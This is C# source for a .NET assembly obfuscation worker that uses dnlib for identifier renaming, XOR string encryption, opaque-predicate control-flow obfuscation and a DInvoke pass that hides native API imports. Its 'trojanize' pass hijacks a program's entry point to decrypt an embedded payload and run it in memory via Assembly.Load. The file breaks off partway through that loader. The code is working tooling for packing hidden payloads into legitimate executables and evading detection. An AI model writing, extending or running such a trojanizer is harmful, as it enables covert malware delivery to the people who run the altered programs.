// Dotnet IL obfuscation worker — applies dnlib-based passes to .NET assemblies.
// Invoked as subprocess by penumbra.dotnet.il_worker.

using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace DotnetWorker;

internal static class Program
{
    private static int Main(string[] args)
    {
        try
        {
            return Run(args);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"dotnet-worker error: {ex.Message}");
            return 1;
        }
    }

    private static int Run(string[] args)
    {
        string? inputPath = null;
        string? outputPath = null;
        string? passesArg = null;
        string? payloadFile = null;
        string? keyFile = null;
        bool safeRename = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--input" when i + 1 < args.Length:
                    inputPath = args[++i];
                    break;
                case "--output" when i + 1 < args.Length:
                    outputPath = args[++i];
                    break;
                case "--passes" when i + 1 < args.Length:
                    passesArg = args[++i];
                    break;
                case "--payload-file" when i + 1 < args.Length:
                    payloadFile = args[++i];
                    break;
                case "--key-file" when i + 1 < args.Length:
                    keyFile = args[++i];
                    break;
                case "--safe-rename":
                    safeRename = true;
                    break;
                default:
                    Console.Error.WriteLine($"Unknown argument: {args[i]}");
                    return 1;
            }
        }

        if (inputPath == null || outputPath == null || passesArg == null)
        {
            Console.Error.WriteLine(
                "Usage: dotnet-worker --input <path> --output <path> --passes <list> [--safe-rename]");
            return 1;
        }

        var passes = passesArg.Split(',', StringSplitOptions.RemoveEmptyEntries);

        Console.Error.WriteLine($"Loading module: {inputPath}");
        var module = ModuleDefMD.Load(inputPath);

        foreach (var pass in passes)
        {
            Console.Error.WriteLine($"Applying pass: {pass}");
            switch (pass.Trim())
            {
                case "rename":
                    ApplyRename(module, safeRename);
                    break;
                case "encrypt-strings":
                    ApplyEncryptStrings(module);
                    break;
                case "flow":
                    ApplyFlow(module);
                    break;
                case "strip-debug":
                    ApplyStripDebug(module);
                    break;
                case "dinvoke":
                    ApplyDInvoke(module);
                    break;
                case "trojanize":
                    if (payloadFile == null || keyFile == null)
                    {
                        Console.Error.WriteLine("trojanize requires --payload-file and --key-file");
                        return 1;
                    }
                    ApplyTrojanize(module, payloadFile, keyFile);
                    break;
                default:
                    Console.Error.WriteLine($"Unknown pass: {pass}");
                    return 1;
            }
        }

        Console.Error.WriteLine($"Writing output: {outputPath}");
        var opts = new dnlib.DotNet.Writer.ModuleWriterOptions(module)
        {
            MetadataOptions = { Flags = dnlib.DotNet.Writer.MetadataFlags.KeepOldMaxStack }
        };
        module.Write(outputPath, opts);
        Console.Error.WriteLine("Done.");
        return 0;
    }

    // ── Rename pass ──────────────────────────────────────────────────────

    private static string RandomId()
    {
        return "_" + Guid.NewGuid().ToString("N")[..8];
    }

    private static HashSet<string> CollectStringLiterals(ModuleDef module)
    {
        var strings = new HashSet<string>(StringComparer.Ordinal);
        foreach (var type in module.GetTypes())
        {
            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                foreach (var instr in method.Body.Instructions)
                {
                    if (instr.OpCode == OpCodes.Ldstr && instr.Operand is string s)
                        strings.Add(s);
                }
            }
        }
        return strings;
    }

    private static void ApplyRename(ModuleDef module, bool safeRename)
    {
        var entryPoint = module.EntryPoint;
        var literals = safeRename ? CollectStringLiterals(module) : new HashSet<string>();

        foreach (var type in module.GetTypes().ToList())
        {
            if (type.IsGlobalModuleType) continue;
            if (safeRename && literals.Contains(type.Name.String)) continue;

            type.Name = RandomId();

            foreach (var method in type.Methods)
            {
                if (method.IsConstructor) continue;
                if (method == entryPoint) continue;
                if (safeRename && literals.Contains(method.Name.String)) continue;
                method.Name = RandomId();
            }

            foreach (var field in type.Fields)
            {
                if (safeRename && literals.Contains(field.Name.String)) continue;
                field.Name = RandomId();
            }

            foreach (var prop in type.Properties)
            {
                if (safeRename && literals.Contains(prop.Name.String)) continue;
                prop.Name = RandomId();
            }
        }
    }

    // ── Encrypt-strings pass ─────────────────────────────────────────────

    private static void ApplyEncryptStrings(ModuleDef module)
    {
        // Inject decryptor helper class
        var decryptorType = new TypeDefUser(
            "Penumbra_Internal",
            RandomId(),
            module.CorLibTypes.Object.TypeDefOrRef);
        decryptorType.Attributes = TypeAttributes.NotPublic | TypeAttributes.Sealed
            | TypeAttributes.Abstract; // static class

        // Create decrypt method: static string Decrypt(string base64Data, string base64Key)
        var decryptMethod = new MethodDefUser(
            "Decrypt",
            MethodSig.CreateStatic(module.CorLibTypes.String,
                module.CorLibTypes.String, module.CorLibTypes.String),
            MethodImplAttributes.IL | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig);

        decryptMethod.Body = new CilBody();
        var body = decryptMethod.Body;
        body.InitLocals = true;

        // Local variables
        var byteArrayType = new SZArraySig(module.CorLibTypes.Byte);
        body.Variables.Add(new Local(byteArrayType));  // loc0: byte[] data
        body.Variables.Add(new Local(byteArrayType));  // loc1: byte[] key
        body.Variables.Add(new Local(module.CorLibTypes.Int32)); // loc2: i

        // Import methods we need
        var convertType = module.CorLibTypes.GetTypeRef("System", "Convert");
        var fromBase64 = new MemberRefUser(module, "FromBase64String",
            MethodSig.CreateStatic(byteArrayType, module.CorLibTypes.String),
            convertType);

        var encodingType = module.CorLibTypes.GetTypeRef("System.Text", "Encoding");
        var getUtf8 = new MemberRefUser(module, "get_UTF8",
            MethodSig.CreateInstance(
                new ClassSig(encodingType)),
            encodingType);
        // Actually Encoding.UTF8 returns Encoding, and GetString takes byte[] returns string
        var getUtf8Prop = new MemberRefUser(module, "get_UTF8",
            MethodSig.CreateStatic(new ClassSig(encodingType)),
            encodingType);
        var getString = new MemberRefUser(module, "GetString",
            MethodSig.CreateInstance(module.CorLibTypes.String, byteArrayType),
            encodingType);

        // byte[] data = Convert.FromBase64String(arg0)
        body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction());
        // byte[] key = Convert.FromBase64String(arg1)
        body.Instructions.Add(OpCodes.Ldarg_1.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
        body.Instructions.Add(OpCodes.Stloc_1.ToInstruction());
        // i = 0
        body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());

        // Loop start
        var loopCheck = OpCodes.Nop.ToInstruction();
        body.Instructions.Add(OpCodes.Br.ToInstruction(loopCheck));

        // Loop body: data[i] ^= key[i % key.Length]
        var loopBody = OpCodes.Ldloc_0.ToInstruction();
        body.Instructions.Add(loopBody);
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        body.Instructions.Add(OpCodes.Rem.ToInstruction());
        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Xor.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_U1.ToInstruction());
        body.Instructions.Add(OpCodes.Stelem_I1.ToInstruction());
        // i++
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
        body.Instructions.Add(OpCodes.Add.ToInstruction());
        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());

        // Loop check: i < data.Length
        body.Instructions.Add(loopCheck);
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        body.Instructions.Add(OpCodes.Blt.ToInstruction(loopBody));

        // return Encoding.UTF8.GetString(data)
        body.Instructions.Add(OpCodes.Call.ToInstruction(getUtf8Prop));
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getString));
        body.Instructions.Add(OpCodes.Ret.ToInstruction());

        body.OptimizeBranches();
        body.OptimizeMacros();

        decryptorType.Methods.Add(decryptMethod);
        module.Types.Add(decryptorType);

        // Now replace all ldstr instructions
        foreach (var type in module.GetTypes().ToList())
        {
            if (type == decryptorType) continue;
            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                var instrs = method.Body.Instructions;
                for (int i = 0; i < instrs.Count; i++)
                {
                    if (instrs[i].OpCode != OpCodes.Ldstr || instrs[i].Operand is not string s)
                        continue;
                    if (string.IsNullOrEmpty(s)) continue;

                    // Encrypt the string
                    var plainBytes = Encoding.UTF8.GetBytes(s);
                    var key = new byte[4];
                    RandomNumberGenerator.Fill(key);
                    var encrypted = new byte[plainBytes.Length];
                    for (int j = 0; j < plainBytes.Length; j++)
                        encrypted[j] = (byte)(plainBytes[j] ^ key[j % key.Length]);

                    var b64Data = Convert.ToBase64String(encrypted);
                    var b64Key = Convert.ToBase64String(key);

                    // Modify the existing instruction in-place to preserve branch targets
                    instrs[i].Operand = b64Data;
                    instrs.Insert(i + 1, OpCodes.Ldstr.ToInstruction(b64Key));
                    instrs.Insert(i + 2, OpCodes.Call.ToInstruction(decryptMethod));
                    i += 2; // skip the newly inserted instructions
                }
                method.Body.SimplifyBranches();
                method.Body.OptimizeBranches();
            }
        }
    }

    // ── Flow pass ────────────────────────────────────────────────────────

    private static void ApplyFlow(ModuleDef module)
    {
        var rng = new Random();
        foreach (var type in module.GetTypes())
        {
            foreach (var method in type.Methods)
            {
                if (!method.HasBody) continue;
                var instrs = method.Body.Instructions;
                if (instrs.Count < 2) continue;

                // Insert NOP padding and opaque predicates at random positions
                // Work backwards to avoid index shifting issues
                var positions = new List<int>();
                for (int i = instrs.Count - 1; i >= 1; i--)
                {
                    if (rng.NextDouble() < 0.3) // 30% chance at each position
                        positions.Add(i);
                }

                foreach (var pos in positions)
                {
                    if (pos >= instrs.Count) continue;

                    // Insert NOP padding (3-5 NOPs)
                    int nopCount = rng.Next(3, 6);
                    for (int n = 0; n < nopCount; n++)
                        instrs.Insert(pos, OpCodes.Nop.ToInstruction());

                    // Insert opaque predicate: ldc.i4 X; ldc.i4 X; ceq; brfalse <next>
                    int val = rng.Next(1, 1000);
                    var target = instrs[pos + nopCount]; // the original instruction
                    instrs.Insert(pos, OpCodes.Ldc_I4.ToInstruction(val));
                    instrs.Insert(pos + 1, OpCodes.Ldc_I4.ToInstruction(val));
                    instrs.Insert(pos + 2, OpCodes.Ceq.ToInstruction());
                    instrs.Insert(pos + 3, OpCodes.Brfalse.ToInstruction(target));
                }

                method.Body.SimplifyBranches();
                method.Body.OptimizeBranches();
                method.Body.OptimizeMacros();
            }
        }
    }

    // ── DInvoke mutation pass ─────────────────────────────────────────────

    private static bool IsSafeForDInvoke(MethodDef method)
    {
        // Conservative: only mutate PInvoke methods with "simple" parameter types.
        // Skip methods with by-ref struct params, function pointer callbacks, etc.
        if (method.Parameters.Count == 0) return true;

        foreach (var param in method.Parameters)
        {
            var t = param.Type;
            if (t == null) continue;
            // Allow: primitives, string, IntPtr, UIntPtr, pointers, byte[]
            if (t.IsPrimitive) continue;
            if (t.FullName is "System.String" or "System.IntPtr" or "System.UIntPtr") continue;
            if (t.IsPointer) continue;
            if (t is SZArraySig arr && arr.Next.IsPrimitive) continue;
            if (t is ByRefSig byRef)
            {
                var inner = byRef.Next;
                if (inner.IsPrimitive) continue;
                if (inner.FullName is "System.IntPtr" or "System.UIntPtr") continue;
                // By-ref struct — skip this method entirely
                return false;
            }
            // ValueType (struct passed by value) — risky marshalling, skip
            if (t is ValueTypeSig) return false;
            // Anything else exotic — skip
            if (t is GenericInstSig or FnPtrSig) return false;
        }
        return true;
    }

    private static void ApplyDInvoke(ModuleDef module)
    {
        // Import System.Runtime.InteropServices references we'll need
        var marshalTypeRef = module.CorLibTypes.GetTypeRef(
            "System.Runtime.InteropServices", "Marshal");
        var nativeLibTypeRef = new TypeRefUser(module,
            "System.Runtime.InteropServices", "NativeLibrary",
            module.CorLibTypes.AssemblyRef);
        var intPtrType = module.CorLibTypes.IntPtr;

        // NativeLibrary.Load(string) -> IntPtr
        var nativeLibLoad = new MemberRefUser(module, "Load",
            MethodSig.CreateStatic(intPtrType, module.CorLibTypes.String),
            nativeLibTypeRef);

        // NativeLibrary.GetExport(IntPtr, string) -> IntPtr
        var nativeLibGetExport = new MemberRefUser(module, "GetExport",
            MethodSig.CreateStatic(intPtrType, intPtrType, module.CorLibTypes.String),
            nativeLibTypeRef);

        // Collect all PInvoke methods to mutate
        var pinvokeMethods = new List<(MethodDef method, string dllName, string entryPoint)>();
        foreach (var type in module.GetTypes())
        {
            foreach (var method in type.Methods)
            {
                if (!method.IsPinvokeImpl || method.ImplMap == null) continue;
                if (!IsSafeForDInvoke(method)) {
                    Console.Error.WriteLine($"  [dinvoke] skipping (complex params): {method.FullName}");
                    continue;
                }
                var implMap = method.ImplMap;
                pinvokeMethods.Add((method, implMap.Module.Name.String, implMap.Name.String));
            }
        }

        Console.Error.WriteLine($"  [dinvoke] found {pinvokeMethods.Count} PInvoke methods to mutate");

        // Create a static helper class to hold resolver fields and delegates
        var helperType = new TypeDefUser(
            "Penumbra_DInvoke", RandomId(),
            module.CorLibTypes.Object.TypeDefOrRef);
        helperType.Attributes = TypeAttributes.NotPublic | TypeAttributes.Sealed
            | TypeAttributes.Abstract; // static class
        module.Types.Add(helperType);

        // Cache: dll name -> library handle field
        var libHandleFields = new Dictionary<string, FieldDef>(StringComparer.OrdinalIgnoreCase);

        foreach (var (method, dllName, entryPoint) in pinvokeMethods)
        {
            // 1. Create a delegate type matching the PInvoke signature
            var delegateType = CreateDelegateType(module, method, helperType);

            // 2. Create a static field to cache the delegate instance
            var delegateField = new FieldDefUser(
                RandomId(),
                new FieldSig(new ClassSig(delegateType)),
                FieldAttributes.Private | FieldAttributes.Static);
            helperType.Fields.Add(delegateField);

            // 3. Ensure we have a library handle field for this DLL
            if (!libHandleFields.TryGetValue(dllName, out var libField))
            {
                libField = new FieldDefUser(
                    RandomId(),
                    new FieldSig(intPtrType),
                    FieldAttributes.Private | FieldAttributes.Static);
                helperType.Fields.Add(libField);
                libHandleFields[dllName] = libField;
            }

            // 4. Create a resolver method that lazily initializes the delegate
            var resolverMethod = CreateResolverMethod(
                module, method, delegateType, delegateField, libField,
                dllName, entryPoint, nativeLibLoad, nativeLibGetExport,
                marshalTypeRef, helperType);

            // 5. Remove PInvoke metadata from the original method
            method.IsPinvokeImpl = false;
            method.ImplMap = null;
            method.Attributes &= ~MethodAttributes.PinvokeImpl;
            method.Attributes |= MethodAttributes.Static; // ensure static
            method.ImplAttributes = MethodImplAttributes.IL | MethodImplAttributes.Managed;

            // 6. Replace the method body: call the resolver, which returns delegate, then invoke it
            method.Body = new CilBody();
            var body = method.Body;
            body.InitLocals = true;

            // Call resolver to get delegate
            body.Instructions.Add(OpCodes.Call.ToInstruction(resolverMethod));

            // Push all original parameters
            for (int i = 0; i < method.Parameters.Count; i++)
            {
                body.Instructions.Add(new Instruction(OpCodes.Ldarg, method.Parameters[i]));
            }

            // Find the Invoke method on the delegate type
            var invokeMethod = delegateType.FindMethod("Invoke");
            body.Instructions.Add(OpCodes.Callvirt.ToInstruction(invokeMethod));
            body.Instructions.Add(OpCodes.Ret.ToInstruction());
            body.OptimizeBranches();
            body.OptimizeMacros();
        }
    }

    private static TypeDefUser CreateDelegateType(
        ModuleDef module, MethodDef pinvokeMethod, TypeDef parentType)
    {
        // Create: sealed class <name> : System.MulticastDelegate
        var multicastDelegateRef = new TypeRefUser(module, "System", "MulticastDelegate",
            module.CorLibTypes.AssemblyRef);

        var delegateType = new TypeDefUser(
            parentType.Namespace, RandomId(), multicastDelegateRef);
        delegateType.Attributes = TypeAttributes.NotPublic | TypeAttributes.Sealed;

        // .ctor(object, IntPtr)
        var ctorSig = MethodSig.CreateInstance(
            module.CorLibTypes.Void,
            module.CorLibTypes.Object,
            module.CorLibTypes.IntPtr);
        var ctor = new MethodDefUser(".ctor", ctorSig,
            MethodImplAttributes.Runtime | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.HideBySig
            | MethodAttributes.SpecialName | MethodAttributes.RTSpecialName);
        delegateType.Methods.Add(ctor);

        // Build the Invoke signature matching the PInvoke method
        var paramTypes = new List<TypeSig>();
        foreach (var param in pinvokeMethod.MethodSig.Params)
            paramTypes.Add(param);

        var invokeSig = MethodSig.CreateInstance(
            pinvokeMethod.MethodSig.RetType, paramTypes.ToArray());
        var invokeMethod = new MethodDefUser("Invoke", invokeSig,
            MethodImplAttributes.Runtime | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.HideBySig
            | MethodAttributes.NewSlot | MethodAttributes.Virtual);

        // Copy parameter names and marshal attributes from the PInvoke method
        for (int i = 0; i < pinvokeMethod.ParamDefs.Count; i++)
        {
            var origParam = pinvokeMethod.ParamDefs[i];
            var newParam = new ParamDefUser(origParam.Name, origParam.Sequence, origParam.Attributes);
            if (origParam.MarshalType != null)
                newParam.MarshalType = origParam.MarshalType;
            invokeMethod.ParamDefs.Add(newParam);
        }

        // Copy return type marshal info
        if (pinvokeMethod.Parameters.ReturnParameter.ParamDef?.MarshalType != null)
        {
            var retParam = new ParamDefUser("", 0, 0);
            retParam.MarshalType = pinvokeMethod.Parameters.ReturnParameter.ParamDef.MarshalType;
            invokeMethod.ParamDefs.Insert(0, retParam);
        }

        delegateType.Methods.Add(invokeMethod);
        module.Types.Add(delegateType);

        return delegateType;
    }

    private static MethodDefUser CreateResolverMethod(
        ModuleDef module, MethodDef pinvokeMethod,
        TypeDefUser delegateType, FieldDef delegateField, FieldDef libField,
        string dllName, string entryPoint,
        MemberRefUser nativeLibLoad, MemberRefUser nativeLibGetExport,
        TypeRef marshalTypeRef, TypeDef helperType)
    {
        // static DelegateType Resolve()
        // {
        //     if (cachedDelegate == null)
        //     {
        //         if (libHandle == IntPtr.Zero)
        //             libHandle = NativeLibrary.Load("dllName");
        //         var ptr = NativeLibrary.GetExport(libHandle, "entryPoint");
        //         cachedDelegate = Marshal.GetDelegateForFunctionPointer<DelegateType>(ptr);
        //     }
        //     return cachedDelegate;
        // }

        var delegateSig = new ClassSig(delegateType);
        var resolverSig = MethodSig.CreateStatic(delegateSig);
        var resolver = new MethodDefUser(RandomId(), resolverSig,
            MethodImplAttributes.IL | MethodImplAttributes.Managed,
            MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig);

        resolver.Body = new CilBody();
        var body = resolver.Body;
        body.InitLocals = true;
        body.Variables.Add(new Local(module.CorLibTypes.IntPtr)); // loc0: funcPtr

        // Marshal.GetDelegateForFunctionPointer<T>(IntPtr) - generic method
        // We need to reference the generic method and instantiate it
        var getDelegateGeneric = new MemberRefUser(module, "GetDelegateForFunctionPointer",
            MethodSig.CreateStatic(new GenericMVar(0), module.CorLibTypes.IntPtr),
            marshalTypeRef);
        // Create the MethodSpec for the generic instantiation
        var getDelegateSpec = new MethodSpecUser(getDelegateGeneric,
            new GenericInstMethodSig(delegateSig));

        var intPtrZero = new MemberRefUser(module, "get_Zero",
            MethodSig.CreateStatic(module.CorLibTypes.IntPtr),
            module.CorLibTypes.GetTypeRef("System", "IntPtr"));

        var intPtrOpEquality = new MemberRefUser(module, "op_Equality",
            MethodSig.CreateStatic(module.CorLibTypes.Boolean,
                module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr),
            module.CorLibTypes.GetTypeRef("System", "IntPtr"));

        var returnLabel = OpCodes.Ldsfld.ToInstruction(delegateField);

        // if (cachedDelegate != null) goto return
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(delegateField));
        var brIfCached = OpCodes.Brtrue.ToInstruction(returnLabel);
        body.Instructions.Add(brIfCached);

        // if (libHandle == IntPtr.Zero) libHandle = NativeLibrary.Load(dllName)
        var skipLoad = OpCodes.Nop.ToInstruction();
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(libField));
        body.Instructions.Add(OpCodes.Call.ToInstruction(intPtrZero));
        body.Instructions.Add(OpCodes.Call.ToInstruction(intPtrOpEquality));
        body.Instructions.Add(OpCodes.Brfalse.ToInstruction(skipLoad));
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(dllName));
        body.Instructions.Add(OpCodes.Call.ToInstruction(nativeLibLoad));
        body.Instructions.Add(OpCodes.Stsfld.ToInstruction(libField));
        body.Instructions.Add(skipLoad);

        // var ptr = NativeLibrary.GetExport(libHandle, entryPoint)
        body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(libField));
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(entryPoint));
        body.Instructions.Add(OpCodes.Call.ToInstruction(nativeLibGetExport));
        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction());

        // cachedDelegate = Marshal.GetDelegateForFunctionPointer<DelegateType>(ptr)
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(getDelegateSpec));
        body.Instructions.Add(OpCodes.Stsfld.ToInstruction(delegateField));

        // return cachedDelegate
        body.Instructions.Add(returnLabel);
        body.Instructions.Add(OpCodes.Ret.ToInstruction());

        body.SimplifyBranches();
        body.OptimizeBranches();
        body.OptimizeMacros();

        helperType.Methods.Add(resolver);
        return resolver;
    }

    // ── Trojanize pass ──────────────────────────────────────────────────

    private static void ApplyTrojanize(ModuleDef module, string payloadFile, string keyFile)
    {
        var payloadB64 = File.ReadAllText(payloadFile).Trim();
        var keyB64 = File.ReadAllText(keyFile).Trim();

        Console.Error.WriteLine($"  [trojanize] payload size: {payloadB64.Length} chars (base64)");

        // 1. Add encrypted payload and key as embedded resources
        var resourceName = RandomId().TrimStart('_') + ".dat";
        var keyResourceName = RandomId().TrimStart('_') + ".key";

        var payloadBytes = Encoding.UTF8.GetBytes(payloadB64);
        var keyBytes = Encoding.UTF8.GetBytes(keyB64);

        module.Resources.Add(new EmbeddedResource(resourceName, payloadBytes));
        module.Resources.Add(new EmbeddedResource(keyResourceName, keyBytes));

        // 2. Find or create the entry point method
        var entryPoint = module.EntryPoint;
        if (entryPoint == null)
        {
            Console.Error.WriteLine("  [trojanize] warning: no entry point found, skipping");
            return;
        }

        Console.Error.WriteLine($"  [trojanize] hijacking entry point: {entryPoint.FullName}");

        // 3. Build the loader IL that replaces the entry point body
        // The logic:
        //   var asm = typeof(EntryClass).Assembly;
        //   var stream = asm.GetManifestResourceStream("resourceName");
        //   var reader = new StreamReader(stream);
        //   var payloadB64 = reader.ReadToEnd();
        //   stream = asm.GetManifestResourceStream("keyResourceName");
        //   reader = new StreamReader(stream);
        //   var keyB64Str = reader.ReadToEnd();
        //   var enc = Convert.FromBase64String(payloadB64);
        //   var key = Convert.FromBase64String(keyB64Str);
        //   var plain = new byte[enc.Length];
        //   for (int i = 0; i < enc.Length; i++) plain[i] = (byte)(enc[i] ^ key[i % key.Length]);
        //   var loaded = Assembly.Load(plain);
        //   loaded.EntryPoint.Invoke(null, new object[] { args });

        entryPoint.Body = new CilBody();
        var body = entryPoint.Body;
        body.InitLocals = true;

        var byteArraySig = new SZArraySig(module.CorLibTypes.Byte);
        var objectArraySig = new SZArraySig(module.CorLibTypes.Object);

        // Local variables
        body.Variables.Add(new Local(module.CorLibTypes.String));    // 0: payloadStr
        body.Variables.Add(new Local(module.CorLibTypes.String));    // 1: keyStr
        body.Variables.Add(new Local(byteArraySig));                // 2: enc
        body.Variables.Add(new Local(byteArraySig));                // 3: keyArr
        body.Variables.Add(new Local(byteArraySig));                // 4: plain
        body.Variables.Add(new Local(module.CorLibTypes.Int32));     // 5: i
        body.Variables.Add(new Local(module.CorLibTypes.Object));    // 6: asmObj (Assembly)

        // Import references
        var assemblyTypeRef = new TypeRefUser(module, "System.Reflection", "Assembly",
            module.CorLibTypes.AssemblyRef);
        var streamTypeRef = new TypeRefUser(module, "System.IO", "Stream",
            module.CorLibTypes.AssemblyRef);
        var streamReaderTypeRef = new TypeRefUser(module, "System.IO", "StreamReader",
            module.CorLibTypes.AssemblyRef);
        var typeTypeRef = module.CorLibTypes.GetTypeRef("System", "Type");

        var streamSig = new ClassSig(streamTypeRef);
        var assemblySig = new ClassSig(assemblyTypeRef);
        var methodInfoTypeRef = new TypeRefUser(module, "System.Reflection", "MethodInfo",
            module.CorLibTypes.AssemblyRef);
        var methodInfoSig = new ClassSig(methodInfoTypeRef);
        var methodBaseSig = new ClassSig(
            new TypeRefUser(module, "System.Reflection", "MethodBase",
                module.CorLibTypes.AssemblyRef));

        // Type.GetTypeFromHandle(RuntimeTypeHandle) -> Type
        var getTypeFromHandle = new MemberRefUser(module, "GetTypeFromHandle",
            MethodSig.CreateStatic(new ClassSig(typeTypeRef),
                new ValueTypeSig(module.CorLibTypes.GetTypeRef("System", "RuntimeTypeHandle"))),
            typeTypeRef);

        // Type.get_Assembly -> Assembly (instance property)
        var typeGetAssembly = new MemberRefUser(module, "get_Assembly",
            MethodSig.CreateInstance(assemblySig),
            typeTypeRef);

        // Assembly.GetManifestResourceStream(string) -> Stream
        var getResourceStream = new MemberRefUser(module, "GetManifestResourceStream",
            MethodSig.CreateInstance(streamSig, module.CorLibTypes.String),
            assemblyTypeRef);

        // new StreamReader(Stream) constructor
        var streamReaderCtor = new MemberRefUser(module, ".ctor",
            MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig),
            streamReaderTypeRef);

        // StreamReader inherits TextReader.ReadToEnd() -> string
        var textReaderTypeRef = new TypeRefUser(module, "System.IO", "TextReader",
            module.CorLibTypes.AssemblyRef);
        var readToEnd = new MemberRefUser(module, "ReadToEnd",
            MethodSig.CreateInstance(module.CorLibTypes.String),
            textReaderTypeRef);

        // Convert.FromBase64String(string) -> byte[]
        var convertTypeRef = module.CorLibTypes.GetTypeRef("System", "Convert");
        var fromBase64 = new MemberRefUser(module, "FromBase64String",
            MethodSig.CreateStatic(byteArraySig, module.CorLibTypes.String),
            convertTypeRef);

        // Assembly.Load(byte[]) -> Assembly
        var assemblyLoad = new MemberRefUser(module, "Load",
            MethodSig.CreateStatic(assemblySig, byteArraySig),
            assemblyTypeRef);

        // Assembly.get_EntryPoint -> MethodInfo
        var getEntryPoint = new MemberRefUser(module, "get_EntryPoint",
            MethodSig.CreateInstance(methodInfoSig),
            assemblyTypeRef);

        // MethodBase.Invoke(object, object[]) -> object
        var methodInvoke = new MemberRefUser(module, "Invoke",
            MethodSig.CreateInstance(module.CorLibTypes.Object,
                module.CorLibTypes.Object, objectArraySig),
            new TypeRefUser(module, "System.Reflection", "MethodBase",
                module.CorLibTypes.AssemblyRef));

        // MethodBase.GetParameters() -> ParameterInfo[]
        var getParameters = new MemberRefUser(module, "GetParameters",
            MethodSig.CreateInstance(
                new SZArraySig(new ClassSig(
                    new TypeRefUser(module, "System.Reflection", "ParameterInfo",
                        module.CorLibTypes.AssemblyRef)))),
            new TypeRefUser(module, "System.Reflection", "MethodBase",
                module.CorLibTypes.AssemblyRef));

        // Get reference to a type in this module for typeof()
        var entryType = entryPoint.DeclaringType;

        // --- Emit IL ---

        // var asm = typeof(EntryType).Assembly;
        body.Instructions.Add(OpCodes.Ldtoken.ToInstruction(entryType));
        body.Instructions.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(typeGetAssembly));

        // var stream = asm.GetManifestResourceStream("resourceName");
        body.Instructions.Add(OpCodes.Dup.ToInstruction()); // keep asm on stack
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(resourceName));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getResourceStream));
        // new StreamReader(stream).ReadToEnd()
        body.Instructions.Add(OpCodes.Newobj.ToInstruction(streamReaderCtor));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction()); // payloadStr

        // stream = asm.GetManifestResourceStream("keyResourceName");
        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(keyResourceName));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getResourceStream));
        body.Instructions.Add(OpCodes.Newobj.ToInstruction(streamReaderCtor));
        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        body.Instructions.Add(OpCodes.Stloc_1.ToInstruction()); // keyStr

        // enc = Convert.FromBase64String(payloadStr);
        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());

        // keyArr = Convert.FromBase64String(keyStr);
        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
        body.Instructions.Add(OpCodes.Stloc_3.ToInstruction());

        // plain = new byte[enc.Length];
        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
        body.Instructions.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Byte.TypeDefOrRef));
        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[4]));

        // i = 0
